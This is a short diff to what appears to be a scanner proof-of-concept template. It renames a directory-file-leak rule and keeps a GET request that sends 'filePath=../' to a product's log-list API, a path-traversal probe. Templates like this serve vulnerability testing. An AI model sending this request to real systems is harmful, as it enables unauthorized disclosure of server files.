@@ -1,4 +1,4 @@
-name: poc-yaml-him-directory-file-leak
+name: poc-yaml-hjtcloud-directory-file-leak
 rules:
   - method: GET
     path: "/him/api/rest/V1.0/system/log/list?filePath=../"
